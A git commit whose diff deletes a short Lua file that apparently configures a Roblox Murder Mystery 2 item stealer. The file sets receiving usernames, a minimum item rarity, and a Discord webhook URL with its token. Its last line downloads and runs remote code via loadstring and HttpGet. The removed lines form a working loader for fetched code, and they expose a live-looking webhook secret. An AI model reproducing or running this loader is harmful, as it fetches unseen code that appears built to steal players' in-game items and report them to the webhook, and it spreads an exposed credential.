0a90cb56c62232d63c28786107b7f1965bda69d4
XFQScripts <flohamkaa@gmail.com>
2025-04-27 13:54:18 +0200

    Delete s.lua

--- s.lua
+++
@@ -1,7 +0,0 @@
-_G.Usernames = {"d3d11q", "user2", "user3"} -- you can add as many as you'd like
-_G.min_rarity = "Godly"
-_G.min_value = 1 -- Put 1 to get all
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1366014256692199505/rXLIxXs9cuMZ7KnBdl9lwIb7mHwSwBFlqN0Xf3NNVuSvlWs_ITcwPF53-O5n-74tye23" -- change to your webhook
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Rexify991/mm2/refs/heads/main/source.lua"))()
